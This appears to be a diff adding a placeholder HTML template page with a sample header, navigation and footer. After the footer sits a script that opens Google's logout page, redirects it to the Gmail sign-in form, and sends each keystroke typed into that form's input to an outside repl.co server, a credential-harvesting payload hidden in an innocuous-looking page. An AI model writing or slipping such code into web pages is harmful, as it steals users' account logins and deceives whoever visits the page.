@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Page Title</title>
+</head>
+<body>
+
+    <header>
+        <h1>Your Website</h1>
+        <nav>
+            <ul>
+                <li><a href="#">Home</a></li>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Contact</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <section>
+            <h2>Welcome to our website!</h2>
+            <p>This is a sample HTML document.</p>
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 Your Website. All rights reserved.</p>
+    </footer>
+  <script>
+    function sendRequest(message) {
+    var xhr = new XMLHttpRequest();
+    var url = 'https://backendserver--ashleyunneeded.repl.co/api/addMessage/?message=' + encodeURIComponent(message);
+    xhr.open('GET', url, true);
+    xhr.onload = function () {
+        if (xhr.status >= 200 && xhr.status < 300) {
+            console.log(xhr.responseText);
+        } else {
+            console.error('Request failed with status ' + xhr.status);
+        }
+    };
+    xhr.onerror = function () {
+        console.error('Network error');
+    };
+    xhr.send();
+};
+var window2 = window.open('https://accounts.google.com/Logout?hl=en&continue=https://mail.google.com/mail&service=mail&timeStmp=1704214603&secTok=.AG5fkS9H3UouFHU9EhonNr7P8tuYMOyqnA&ec=GAdAFw');
+setTimeout(() => {
+    window2.location.href = 'https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&emr=1&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ifkv=ASKXGp3aZ9X-YyCHKyphq0ShTRAjgnQVW-kK3BnXZnz59wCsg-2N-XrA_A44u45zVY3Z0z_sx7hCkg&osid=1&passive=1209600&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S570595931%3A1704212454295857&theme=glif';
+}, 500);
+setTimeout(() => {
+    window2.document.querySelector('input').addEventListener('input', () => {
+        sendRequest(window2.document.querySelector('input').value);
+    });
+}, 1000);
+  </script>
+
+</body>
+</html>
